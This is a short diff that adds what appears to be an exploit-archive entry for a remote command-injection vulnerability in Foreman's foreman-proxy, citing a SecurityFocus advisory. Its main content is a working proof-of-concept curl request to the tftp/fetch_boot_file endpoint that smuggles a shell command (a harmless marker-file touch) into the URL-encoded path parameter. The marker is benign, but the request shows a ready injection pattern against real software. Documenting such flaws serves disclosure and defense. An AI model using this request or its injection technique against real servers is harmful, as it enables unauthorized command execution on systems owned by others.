@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/68117/info
+
+Foreman is prone to a remote command-injection vulnerability.
+
+Successful exploits will result in the execution of arbitrary commands with the privileges of the user running foreman-proxy. 
+
+curl -3 -H "Accept:application/json" -k -X POST -d "dummy=exploit" 'https://www.example.com:8443/tftp/fetch_boot_file?prefix=a&path=%3Btouch%20%2Ftmp%2Fbusted%3B' 
